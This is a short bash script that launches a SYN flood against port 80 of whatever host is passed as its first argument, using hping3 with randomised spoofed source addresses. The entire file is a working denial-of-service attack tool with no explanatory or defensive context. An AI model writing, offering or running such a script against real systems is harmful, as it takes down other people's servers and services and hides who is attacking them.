#!/bin/bash
hping3 --syn --flood --verbose --rand-source -p 80 "$1"
